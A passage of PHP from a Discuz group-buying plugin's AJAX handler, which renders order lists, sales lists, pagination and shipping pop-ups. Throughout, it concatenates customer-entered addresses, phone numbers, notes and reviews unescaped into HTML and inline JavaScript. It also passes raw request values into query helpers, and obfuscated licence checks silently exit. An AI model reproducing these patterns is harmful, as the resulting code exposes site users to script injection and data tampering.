			$it618_statebtn=' <a href="javascript:" class="saleabtn" onclick="alert(\''.$it618_tuan_order['it618_addr'].' '.$it618_tuan_order['it618_tel'].'\')">'.it618_tuan_getlang('s863').'</a>';
			if($it618_tuan_order['it618_state']==1){
				$it618_statebtn.=' <a href="javascript:" class="saleabtn" onclick="delorder('.$it618_tuan_order['id'].')">'.it618_tuan_getlang('s1000').'</a>';
			}else{
				$it618_tuan_kd=C::t('#it618_tuan#it618_tuan_kd')->fetch_by_id($it618_tuan_order['it618_kdid']);
				$it618_statebtn.=' '.it618_tuan_getlang('s775').'<span title="'.$it618_tuan_order['it618_bz'].'">'.$it618_tuan_kd['it618_name'].' '.it618_tuan_getkd('it618_tuan_order',$it618_tuan_order['id'],$it618_tuan_kd['it618_kdcomid'],$it618_tuan_order['it618_kddan']).'</span>';
				if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
			}
			
			$tmpurl=it618_tuan_getrewrite('tuan_wap','product@'.$it618_tuan_goods['id'],'plugin.php?id=it618_tuan:wap&pagetype=product&cid='.$it618_tuan_goods['id']);
			$orderlist_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="118" style="text-align:left;vertical-align:top;border:none">
							<a href="'.$tmpurl.'">
							<img src="'.it618_tuan_getwapppic($it618_tuan_goods['it618_shopid'],$it618_tuan_goods['id'],$it618_tuan_goods['it618_picbig']).'" width="108" height="108" style="border-radius: 3px;"/></a>
							</td><td style="text-align:left;vertical-align:top;line-height:18px;border:none;color:#999">
							<a class="name" href="'.$tmpurl.'" target="_blank" style="font-size:14px;color:#333">'.$it618_tuan_goods['it618_name'].'</a><br>
							'.$gtypename.'<br>'.it618_tuan_getlang('t243').':'.$it618_tuan_order['it618_count'].'<span style="float:right">'.$it618_gthdidstr.'</span><br><div style="float:right">'.$it618_state.'</div> <font color=#ccc>'.date('Y-m-d H:i:s', $it618_tuan_order['it618_time']).'</font><br>'.$it618_statebtn.'
							</td></tr>
						</table>
					</dd>';

		}
		if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_tuan/kindeditor/themes/common/right.txt')){
			$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/ajax.inc.php';
			
			$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/lang.func.php';
			
		}
		if($_GET['ac1']=='wapmyshoporder'){
			$bz='';$strcontent='';
			if($it618_tuan_order['it618_bz']!=""){
				$bz=' <a href="javascript:" class="saleabtn" onclick="bz'.$it618_tuan_order[id].'()">'.it618_tuan_getlang('s869').'</a> ';
			}
			
			$bzbtn='';$kdbtn='1';
			
			if($it618_tuan_order['it618_state']<=2){
				if($it618_tuan_order['it618_kddan']==''){
					$it618_statebtn='<a href="javascript:" class="saleabtn" onclick="fahuo'.$it618_tuan_order[id].'()">'.it618_tuan_getlang('s784').'</a> <a href="javascript:" class="saleabtn" onclick="shopdelorder('.$it618_tuan_order[id].')">'.it618_tuan_getlang('s1030').'</a>';
					$kdbtnname=it618_tuan_getlang('s785');
				}else{
					$kdbtnname=it618_tuan_getlang('s786');
				}
				
				if($it618_tuan_order['it618_state']==2){
					$it618_statebtn='<a href="javascript:" class="saleabtn" onclick="okorder('.$it618_tuan_order[id].',1)">'.it618_tuan_getlang('s1006').'</a> <a href="javascript:" class="saleabtn" onclick="okorder('.$it618_tuan_order[id].',0)">'.it618_tuan_getlang('s1009').'</a>';	
				}
			}else{
				$it618_statebtn='';
				$kdbtnname=it618_tuan_getlang('s787');
				$kdbtn='';
			}
			
			if($kdbtn!='')$kdbtn='<input type="button" class="it618btn" value="'.$kdbtnname.'" onclick="ordersavekd()">';
			if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
			$it618_kddan='';
			if($it618_tuan_order['it618_kddan']!=''){
				$it618_tuan_kd=C::t('#it618_tuan#it618_tuan_kd')->fetch_by_id($it618_tuan_order['it618_kdid']);
				$it618_kddan='<br>'.it618_tuan_getlang('s775').'<span title="'.$it618_tuan_order['it618_bz'].'" style="color:#390">'.$it618_tuan_kd['it618_name'].' '.$it618_tuan_order['it618_kddan'].'</span> <a href="javascript:" class="saleabtn" onclick="fahuo'.$it618_tuan_order[id].'()">'.$kdbtnname.'</a>';
				
			}
			
			$tmp1=str_replace("<option value=".$it618_tuan_order['it618_kdid'],"<option value=".$it618_tuan_order['it618_kdid']." selected=selected",$tmp);
			
			$strcontent.='<div class="kd_fahuo">'.$it618_tuan_order['it618_name'].' '.$it618_tuan_order['it618_addr'].' '.$it618_tuan_order['it618_tel'].'<br><br>'.it618_tuan_getlang('s699').'<br><select id="it618_kdid">'.$tmp1.'</select><input type="text" id="it618_kddan" value="'.$it618_tuan_order['it618_kddan'].'"><input type="hidden" id="orderid" value="'.$it618_tuan_order['id'].'"> '.$kdbtn.' <span style="color:red" id="kdtips"></span></div>';
			
			
			$strtel='';
			if($it618_tuan_order['it618_tel']!=""){
				$strtel=it618_tuan_getlang('s701').$it618_tuan_order['it618_tel'];
			}
			
			$username=it618_tuan_getusername($it618_tuan_order['it618_uid']);
			
			$strtmp=$strtel.$bz;
			
			$tmpurl=it618_tuan_getrewrite('tuan_wap','product@'.$it618_tuan_goods['id'],'plugin.php?id=it618_tuan:wap&pagetype=product&cid='.$it618_tuan_goods['id']);
			$orderlist_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="118" style="text-align:left;vertical-align:top;border:none">
							<a href="'.$tmpurl.'">
							<img src="'.it618_tuan_getwapppic($it618_tuan_goods['it618_shopid'],$it618_tuan_goods['id'],$it618_tuan_goods['it618_picbig']).'" width="108" height="108" style="border-radius: 3px;"/></a>
							</td><td style="text-align:left;vertical-align:top;line-height:18px;border:none;color:#999">
							<a class="name" href="'.$tmpurl.'" target="_blank" style="font-size:14px;color:#333">'.$it618_tuan_goods['it618_name'].'</a><br>
							'.$gtypename.' '.it618_tuan_getlang('t243').':'.$it618_tuan_order['it618_count'].'<br>'.$username.'<span style="float:right">'.$it618_gthdidstr.'</span><br>'.$strtmp.'<br><div style="float:right">'.$it618_state.'</div> <font color=#ccc>'.date('Y-m-d H:i:s', $it618_tuan_order['it618_time']).'</font><br>'.$it618_statebtn.$it618_kddan.'
							</td></tr>
						</table>
					</dd>';
			
			$strcontent=str_replace("'","\"",$strcontent);
			$strcontent=str_replace(array("\r\n", "\r", "\n"),"<br>",$strcontent);
			$tmpjs.='function fahuo'.$it618_tuan_order[id].'(){
						var layerobj = {
							title:"'.it618_tuan_getlang('s866').'",
							titlebgcolor:"#f9f9f9",
							content:\'<table width="98%"><tr><td>'.$strcontent.'</td></tr></table>\',
							bottom:"",
							bottomheight:0,
							allcontent:""
						};
						
						showlayer("orderfahuo",layerobj);
					}';
			if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
			if($it618_tuan_order['it618_bz']!=''){
				$it618_bz=$it618_tuan_order['it618_bz'];
				$it618_bz=str_replace("'","\"",$it618_bz);
				$it618_bz=str_replace(array("\r\n", "\r", "\n"),"<br>",$it618_bz);
				$tmpjs.='function bz'.$it618_tuan_order[id].'(){
							var layerobj = {
								title:"'.it618_tuan_getlang('s867').'",
								titlebgcolor:"#f9f9f9",
								content:\'<table width="98%"><tr><td>'.$it618_bz.'</td></tr></table>\',
								bottom:"",
								bottomheight:0,
								allcontent:""
							};
							
							showlayer("orderbz",layerobj);
						}';
			}
		}
		
		$n=$n+1;
	}
	
	if($_GET['ac1']=='pcmyorder'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_tuan:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_tuan_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_tuan_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_tuan_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_tuan_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_tuan_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_tuan_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_tuan_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	$creditnum=DB::result_first("select extcredits".$it618_tuan['tuan_credit']." from ".DB::table('common_member_count')." where uid=".$uid);
	
	if($_GET['ac1']=='wapmyshoporder'){
		echo it618_tuan_getlang('s1001')."<font color=red>$count</font>"."it618_split".$orderlist_get."it618_split".$multipage.'<script>'.$tmpjs.'</script>';;
	}else{
		echo it618_tuan_getlang('s1001')."<font color=red>$count</font> ".it618_tuan_getlang('s1003')."<font color=red>$jfcount</font>"."it618_split".$orderlist_get."it618_split".$multipage."it618_split".$it618_tuan_lang['s1004'].$creditname.$it618_tuan_lang['s823']."<font color=red>$creditnum</font>";
	}
	exit;
}

if($_GET['ac']=="salelist_get"){
	if($_GET['ac1']=='pcmysale')$ppp = 10;
	if($_GET['ac1']=='wapmysale')$ppp = $it618_tuan['tuan_wapmysalecount'];
	if($_GET['ac1']=='wapmyshopsale')$ppp = $it618_tuan['tuan_wapshopsalecount'];

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;
	
	if($_GET['state']) {
		if($_GET['state']==1)$it618sql .= "and s.it618_state = 1";
		if($_GET['state']==2)$it618sql .= "and s.it618_state = 2";
		if($_GET['state']==3)$it618sql .= "and s.it618_state = 3";
		if($_GET['state']==4)$it618sql .= "and s.it618_state = 4";
		if($_GET['state']==5)$it618sql .= "and s.it618_state = 5";
	}
	if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
	if($_GET['saletype']) {
		if($_GET['saletype']==1)$it618sql .= " and s.it618_saletype = 1";
		if($_GET['saletype']==2)$it618sql .= " and s.it618_saletype = 2";
		if($_GET['saletype']==3)$it618sql .= " and s.it618_saletype = 3";
	}
	
	if($_GET['ac1']=='pcmysale'){		
		$it618_tuan_sales=C::t('#it618_tuan#it618_tuan_sale')->fetch_all_by_search(0,"s.it618_tel!='' and s.it618_state!=0 ".$it618sql,'s.id desc',it618_tuan_utftogbk($_GET['pname']),$uid, $_GET['it618_time1'], $_GET['it618_time2'],$startlimit,$ppp);
		$count=C::t('#it618_tuan#it618_tuan_sale')->count_by_search(0,"s.it618_tel!='' and s.it618_state!=0 ".$it618sql,'',it618_tuan_utftogbk($_GET['pname']),$uid, $_GET['it618_time1'], $_GET['it618_time2']);
		$money=C::t('#it618_tuan#it618_tuan_sale')->sum_money_by_search(0,"s.it618_tel!='' and s.it618_state!=0 ".$it618sql,'',it618_tuan_utftogbk($_GET['pname']),$uid, $_GET['it618_time1'], $_GET['it618_time2']);
		$funname='getmysalelist';
	}
	
	if($_GET['ac1']=='wapmysale'){
		$it618_tuan_sales=C::t('#it618_tuan#it618_tuan_sale')->fetch_all_by_search(0,"s.it618_state!=0 ".$it618sql,'s.id desc',it618_tuan_utftogbk($_GET['pname']),$uid, '', '',$startlimit,$ppp);
		$count=C::t('#it618_tuan#it618_tuan_sale')->count_by_search(0,"s.it618_state!=0 ".$it618sql,'',it618_tuan_utftogbk($_GET['pname']),$uid, '', '');
		$money=C::t('#it618_tuan#it618_tuan_sale')->sum_money_by_search(0,"s.it618_state!=0 ".$it618sql,'',it618_tuan_utftogbk($_GET['pname']),$uid, '', '');
		$funname='getmysalelist';
	}
	

	if($_GET['ac1']=='wapmyshopsale'){
		if($_GET['actype']=='thd'){
			if($uid>0){
				if($it618_tuan_shop_thd = C::t('#it618_tuan#it618_tuan_shop_thd')->fetch_by_uid($uid)){
					$it618_tuan_sales=C::t('#it618_tuan#it618_tuan_sale')->fetch_all_by_search(0,"s.it618_tel!='' and s.it618_state!=0 and s.it618_gthdid=".$it618_tuan_shop_thd['id'].' '.$it618sql,'s.id desc',it618_tuan_utftogbk($_GET['pname']),$_GET['finduid'], '', '',$startlimit,$ppp);
					$count=C::t('#it618_tuan#it618_tuan_sale')->count_by_search(0,"s.it618_tel!='' and s.it618_state!=0 and s.it618_gthdid=".$it618_tuan_shop_thd['id'].' '.$it618sql,'',it618_tuan_utftogbk($_GET['pname']),$_GET['finduid'], '', '');
					$money=C::t('#it618_tuan#it618_tuan_sale')->sum_money_by_search(0,"s.it618_tel!='' and s.it618_state!=0 and s.it618_gthdid=".$it618_tuan_shop_thd['id'].' '.$it618sql,'',it618_tuan_utftogbk($_GET['pname']),$_GET['finduid'], '', '');
					$tcmoney=C::t('#it618_tuan#it618_tuan_sale')->sum_tcmoney_by_search(0,"s.it618_tel!='' and s.it618_state!=0 and s.it618_gthdid=".$it618_tuan_shop_thd['id'].' '.$it618sql,'',it618_tuan_utftogbk($_GET['pname']),$_GET['finduid'], '', '');
					$funname='getmyshopsalelist';
				}else{
					echo '';exit;
				}
			}else{
				echo '';exit;
			}
		}else{
			if($uid>0){
				if($it618_tuan_shop = C::t('#it618_tuan#it618_tuan_shop')->fetch_by_uid_ok($uid)){
					$it618_tuan_sales=C::t('#it618_tuan#it618_tuan_sale')->fetch_all_by_search($it618_tuan_shop['id'],"s.it618_state!=0 ".$it618sql,'s.id desc',it618_tuan_utftogbk($_GET['pname']),$_GET['finduid'], '', '',$startlimit,$ppp);
					$count=C::t('#it618_tuan#it618_tuan_sale')->count_by_search($it618_tuan_shop['id'],"s.it618_state!=0 ".$it618sql,'',it618_tuan_utftogbk($_GET['pname']),$_GET['finduid'], '', '');
					$money=C::t('#it618_tuan#it618_tuan_sale')->sum_money_by_search($it618_tuan_shop['id'],"s.it618_state!=0 ".$it618sql,'',it618_tuan_utftogbk($_GET['pname']),$_GET['finduid'], '', '');
					$tcmoney=C::t('#it618_tuan#it618_tuan_sale')->sum_tcmoney_by_search($it618_tuan_shop['id'],"s.it618_state!=0 ".$it618sql,'',it618_tuan_utftogbk($_GET['pname']),$_GET['finduid'], '', '');
					$funname='getmyshopsalelist';
				}else{
					echo '';exit;
				}
			}else{
				echo '';exit;
			}
		}
		
		$tmp.='<option value="0">'.it618_tuan_getlang('s698').'</option>';
		foreach(C::t('#it618_tuan#it618_tuan_kd')->fetch_all_by_search() as $it618_tuan_kd) {
			$tmp.='<option value='.$it618_tuan_kd['id'].'>'.$it618_tuan_kd['it618_name'].'</option>';
		}
	}
	if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_tuan/kindeditor/themes/common/right.txt')){
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/ajax.inc.php';
		
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/lang.func.php';
		
	}
	$n=0;
	foreach($it618_tuan_sales as $it618_tuan_sale) {
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;
	
		$username=it618_tuan_getusername($it618_tuan_sale['it618_uid']);
		
		$it618_tuan_goods = C::t('#it618_tuan#it618_tuan_goods')->fetch_by_id($it618_tuan_sale['it618_pid']);
		
		$buyuser=$username;
		
		$it618_isservice='';
		if($it618_tuan_sale['it618_saletype']==1){
			if($it618_tuan_sale['it618_isservice1']==1)$it618_isservice.=it618_tuan_getlang('s107').' ';
			if($it618_tuan_sale['it618_isservice2']==1)$it618_isservice.=it618_tuan_getlang('s108').' ';
			if($it618_tuan_sale['it618_isservice3']==1)$it618_isservice.=it618_tuan_getlang('s109').' ';
		}
		
		if($it618_tuan_sale['it618_state']==1)$it618_state='<font color=red>'.it618_tuan_getlang('s191').'</font>';
		if($it618_tuan_sale['it618_state']==2)$it618_state='<font color=blue>'.it618_tuan_getlang('s192').'</font>';
		if($it618_tuan_sale['it618_state']==3)$it618_state='<font color=#390>'.it618_tuan_getlang('s193').'</font>';
		if($it618_tuan_sale['it618_state']==4)$it618_state='<font color=#F0F>'.it618_tuan_getlang('s194').'</font>';
		if($it618_tuan_sale['it618_state']==5)$it618_state='<font color=purple>'.it618_tuan_getlang('s195').'</font>';
		
		$saletime='';
		if($it618_tuan_sale['it618_saletype']==1){
			if($it618_tuan_sale['it618_state']==1&&$it618_tuan_sale['it618_esaletime']!=''){
				$it618_esaletime=strtotime($it618_tuan_sale['it618_esaletime'].':00');
				if($_G['timestamp']>$it618_esaletime){
					$saletime=it618_tuan_getlang('s668').' <font color=red>'.intval(($_G['timestamp']-$it618_esaletime)/3600/24).'</font>'.it618_tuan_getlang('s669');
				}else{
					$it618_bsaletime=strtotime($it618_tuan_sale['it618_bsaletime'].':00');
				}
			}
		}
		
		$jftmp='';
		
		if($_GET['ac1']=='pcmysale')$jfstr='<br>'; else $jfstr='';
		if($jfmoney>0)$jfstr.=it618_tuan_getlang('s672').'<font color="#390">'.$jfmoney.'</font>'.it618_tuan_getlang('s653');
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		if($it618_tuan_sale['it618_jfbl']>0&&$it618_tuan_sale['it618_state']==3){
			$it618_jfbl=intval($it618_tuan_sale['it618_jfbl']*$it618_tuan_sale['it618_price']*$it618_tuan_sale['it618_count']/100);
			$jftmp.=it618_tuan_getlang('s1053').$it618_jfbl.$creditname.'\n\n';
		}
		if($it618_tuan_sale['it618_salejl']>0)$jftmp.=it618_tuan_getlang('s673').$it618_tuan_sale['it618_salejl'].$creditname.it618_tuan_getlang('s674').'\n\n';
		if($it618_tuan_sale['it618_pjjl']>0)$jftmp.=it618_tuan_getlang('s675').$it618_tuan_sale['it618_pjjl'].$creditname.it618_tuan_getlang('s674').'\n\n';
		
		$gtypename='';
		if($it618_tuan_sale['it618_gtypeid']>0){
			$gtypename = C::t('#it618_tuan#it618_tuan_goods_type')->fetch_it618_name_by_id($it618_tuan_sale['it618_gtypeid']);
			$gtypename=' ['.$gtypename.']';
		}
		
		if($_GET['actype']!='thd'){
			$it618_gthdidstr='';
			if($it618_tuan_sale['it618_gthdid']>0){
				$it618_tuan_shop_thd = C::t('#it618_tuan#it618_tuan_shop_thd')->fetch_by_id($it618_tuan_sale['it618_gthdid']);
				$it618_gthdidstr=' <a href="javascript:" class="saleabtn" onclick="alert(\''.$it618_tuan_shop_thd['it618_name'].' '.$it618_tuan_shop_thd['it618_addr'].' '.$it618_tuan_shop_thd['it618_dianhua'].'\')"><font color=red>'.$it618_tuan_lang['t342'].'</font></a>';
			}
		}
		
		if($_GET['ac1']=='pcmysale'){
			$class1name = C::t('#it618_tuan#it618_tuan_class1')->fetch_it618_name_by_id($it618_tuan_goods['it618_class1_id']);
			$class2name = C::t('#it618_tuan#it618_tuan_class2')->fetch_it618_name_by_id($it618_tuan_goods['it618_class2_id']);
			$tmpurl=it618_tuan_getrewrite('tuan_product',$it618_tuan_goods['id'],'plugin.php?id=it618_tuan:product&pid='.$it618_tuan_goods['id']);
			
			if($jftmp!='')$jftmp='<a href="javascript:" class="saleabtn" onclick="alert(\''.$jftmp.'\')">'.it618_tuan_getlang('s676').'</a>';
			
			if($it618_isservice!='')$it618_isservice='<br>'.$it618_isservice;
			if($it618_tuan_sale['it618_state']==1){
				if($it618_tuan_sale['it618_saletype']==1){
					if($it618_tuan_sale['it618_isservice1']==1){
						$it618_state.=' <a href="javascript:" class="saleabtn" onclick="tuikuan('.$it618_tuan_sale['id'].')">'.it618_tuan_getlang('s767').'</a>';
					}
					
					$it618_state.='<br>'.it618_tuan_getlang('s499').'<font color=#390>'.$it618_tuan_sale['it618_code'].'</font>';
					
				}elseif($it618_tuan_sale['it618_saletype']==2){
					$it618_state.=' <a href="javascript:" class="saleabtn" onclick="alert(\''.$it618_tuan_sale['it618_addr'].' '.$it618_tuan_sale['it618_tel'].'\')">'.it618_tuan_getlang('s863').'</a>';
					if($it618_tuan_sale['it618_kddan']==''){
						$it618_fahuo=it618_tuan_getlang('s774');
					}else{
						$it618_fahuo=it618_tuan_getlang('s768').' <a href="javascript:" class="saleabtn" onclick="shouhuo('.$it618_tuan_sale['id'].')">'.it618_tuan_getlang('s769').'</a> ';	
					}
					
					if($it618_tuan_sale['it618_state_tuihuo']==0){
						$it618_state.=' '.$it618_fahuo.' <a href="javascript:" class="saleabtn" onclick="setsaletui('.$it618_tuan_sale['id'].')">'.it618_tuan_getlang('s770').'</a>';
					}
					if($it618_tuan_sale['it618_state_tuihuo']==1){
						$it618_state.=' '.it618_tuan_getlang('s771');
					}
					if($it618_tuan_sale['it618_state_tuihuo']==2){
						$it618_state.=' '.it618_tuan_getlang('s772');
					}
					if($it618_tuan_sale['it618_state_tuihuo']==3){
						if($it618_tuan_sale['it618_kddan']==''){
							$it618_fahuo=' '.it618_tuan_getlang('s774');
						}else{
							$it618_fahuo=' <a href="javascript:" class="saleabtn" onclick="shouhuo('.$it618_tuan_sale['id'].')">'.it618_tuan_getlang('s769').'</a> ';	
						}
						
						$it618_state.=' '.it618_tuan_getlang('s773').' '.$it618_fahuo.' <a href="javascript:" class="saleabtn" onclick="setsaletui('.$it618_tuan_sale['id'].')">'.it618_tuan_getlang('s770').'</a>';
					}
					if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
				}
				
				if($saletime!=''){
					$it618_state.=' '.$saletime;
				}
			}
			
			if($it618_tuan_sale['it618_saletype']==3){
				$it618_state.='<br><a href="javascript:" class="saleabtn" onclick="setsalekm('.$it618_tuan_sale['id'].')">'.it618_tuan_getlang('s865').'</a>';
			}
			$it618_kddan='';$addrtmp='';
			if($it618_tuan_sale['it618_kddan']!=''){
				if($it618_tuan_sale['it618_state']!=1){
					$addrtmp='<a href="javascript:" class="saleabtn" onclick="alert(\''.$it618_tuan_sale['it618_addr'].' '.$it618_tuan_sale['it618_tel'].'\')">'.it618_tuan_getlang('s863').'</a>';	
				}
				$it618_tuan_kd=C::t('#it618_tuan#it618_tuan_kd')->fetch_by_id($it618_tuan_sale['it618_kdid']);
				$it618_kddan='<br>'.it618_tuan_getlang('s775').'<span title="'.$it618_tuan_sale['it618_bz'].'">'.$it618_tuan_kd['it618_name'].' '.it618_tuan_getkd('it618_tuan_sale',$it618_tuan_sale['id'],$it618_tuan_kd['it618_kdcomid'],$it618_tuan_sale['it618_kddan']).'</span>';
			}
			
			$it618_state.=$it618_kddan;
			
			$pjname=C::t('#it618_tuan#it618_tuan_class1')->fetch_it618_pj_by_id($it618_tuan_goods['it618_class1_id']);
			$pjname=explode("_",$pjname);
			$pl='';
			if($it618_tuan_sale['it618_state']==3){
				if($it618_tuan_sale['it618_score1']==0){
					$pl='<a href="javascript:" class="saleabtn" onclick="setsalepj('.$it618_tuan_sale['id'].')">'.it618_tuan_getlang('s776').'</a>';
				}else{
					$pl='<span title="'.$pjname[0].''.$it618_tuan_sale['it618_score1'].it618_tuan_getlang('s501').' '.$pjname[1].''.$it618_tuan_sale['it618_score2'].it618_tuan_getlang('s501').' '.$pjname[2].''.$it618_tuan_sale['it618_score3'].it618_tuan_getlang('s501').' '.$pjname[3].''.$it618_tuan_sale['it618_score4'].it618_tuan_getlang('s501').' '.str_replace('[br]','',$it618_tuan_sale["it618_content"]).'"><font color="#FF6600"><strong>'.$it618_tuan_sale['it618_score1'].'</strong></font>'.it618_tuan_getlang('s501').' '.$it618_tuan_sale['it618_score2'].it618_tuan_getlang('s501').' '.$it618_tuan_sale['it618_score3'].it618_tuan_getlang('s501').' '.$it618_tuan_sale['it618_score4'].it618_tuan_getlang('s501').'</span>';
				}
			}
			
			$disabled='';

			if($it618_tuan_sale['it618_saletype']==1){
				$it618_yxtime='<font color="'.$timecolor.'">'.$it618_tuan_sale['it618_bsaletime'].'<br>'.$it618_tuan_sale['it618_esaletime'].'</font>';
				$it618_saletype=it618_tuan_getlang('s1099');
			}else if($it618_tuan_sale['it618_saletype']==2){
				$it618_yxtime='';
				$it618_isservice='';
				$it618_saletype=it618_tuan_getlang('s1100');
			}else{
				$it618_yxtime='';
				$it618_isservice='';
				$it618_saletype=it618_tuan_getlang('s1101');
			}
			
			if($it618_tuan_sale['it618_gwcid']>0){
				$it618_saletype.=' '.$it618_tuan_lang['t187'].':<font color="#FF3300"><b>'.$it618_tuan_sale['it618_gwcid'].'</b></font>';
			}
			
			if($it618_tuan_sale['it618_isservice1']!=1||$it618_tuan_sale['it618_state']!=1||$saletime!='')$disabled='disabled="disabled"';
			$salelist_get.='<tr class="hover">
						<td><input class="checkbox" type="checkbox" id="chk'.$it618_tuan_sale[id].'" name="chk_sel" value="'.$it618_tuan_sale[id].'" '.$disabled.'><label for="chk'.$it618_tuan_sale[id].'">'.$it618_tuan_sale[id].'</label></td>
						<td><a href="'.$tmpurl.'" target="_blank" title="'.$class1name.'-'.$class2name.' '.$it618_tuan_goods['it618_description'].'">'.cutstr($it618_tuan_goods['it618_name'],40,'...').'</a> '.$it618_tuan_goods['it618_mealname'].$gtypename.'</td>
						<td><font color=red>'.$it618_tuan_sale['it618_count'].'</font></td>
						<td>'.it618_tuan_getsalemoney($it618_tuan_sale,'<br>','pay').'</td>
						<td>'.$it618_saletype.$it618_gthdidstr.$it618_isservice.'</td>
						<td>'.$it618_yxtime.'</td>
						<td>'.$it618_state.'</td>
						<td>'.$pl.'</td>
						<td>'.$jftmp.'</td>
						<td>'.date('Y-m-d H:i:s', $it618_tuan_sale['it618_time']).'</td>
						</tr>';
		}
		
		if($_GET['ac1']=='wapmysale'){
			$pl='';
			if($it618_tuan_sale['it618_state']==3){
				if($it618_tuan_sale['it618_score1']==0){
					$pl=it618_tuan_getlang('s502').' <a href="javascript:" class="saleabtn" onclick="setsalepj('.$it618_tuan_sale['id'].')"><font color=red>'.it618_tuan_getlang('s500').'</font></a>';
				}else{
					$pl=it618_tuan_getlang('s502').'<font color="#FF6600"><strong>'.$it618_tuan_sale['it618_score1'].'</strong></font>'.it618_tuan_getlang('s501').' '.$it618_tuan_sale['it618_score2'].it618_tuan_getlang('s501').' '.$it618_tuan_sale['it618_score3'].it618_tuan_getlang('s501').' '.$it618_tuan_sale['it618_score4'].it618_tuan_getlang('s501');
				}
			}
			
			$it618_statebtn='';$strtmp='';
			if($it618_tuan_sale['it618_state']==1){
				if($it618_tuan_sale['it618_saletype']==1){
					if($it618_tuan_sale['it618_isservice1']==1){
						$it618_statebtn=' <a href="javascript:" class="saleabtn" onclick="tuikuan('.$it618_tuan_sale['id'].')">'.it618_tuan_getlang('s767').'</a>';
					}
					if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
					$it618_statebtn=it618_tuan_getlang('s499').'<font color=#390><b>'.$it618_tuan_sale['it618_code'].'</b></font> '.$it618_statebtn;
					
				}else{
					$it618_state.=' <a href="javascript:" class="saleabtn" onclick="alert(\''.$it618_tuan_sale['it618_addr'].' '.$it618_tuan_sale['it618_tel'].'\')">'.it618_tuan_getlang('s863').'</a>';
					if($it618_tuan_sale['it618_kddan']==''){
						$it618_fahuo=it618_tuan_getlang('s774');
					}else{
						$it618_fahuo=it618_tuan_getlang('s768').' <a href="javascript:" class="saleabtn" onclick="shouhuo('.$it618_tuan_sale['id'].')">'.it618_tuan_getlang('s769').'</a> ';	
					}
					
					if($it618_tuan_sale['it618_state_tuihuo']==0){
						$it618_state.=' '.$it618_fahuo.' <a href="javascript:" class="saleabtn" onclick="setsaletui('.$it618_tuan_sale['id'].')">'.it618_tuan_getlang('s770').'</a>';
					}
					if($it618_tuan_sale['it618_state_tuihuo']==1){
						$it618_state.=' '.it618_tuan_getlang('s771');
					}
					if($it618_tuan_sale['it618_state_tuihuo']==2){
						$it618_state.=' '.it618_tuan_getlang('s772');
					}
					if($it618_tuan_sale['it618_state_tuihuo']==3){
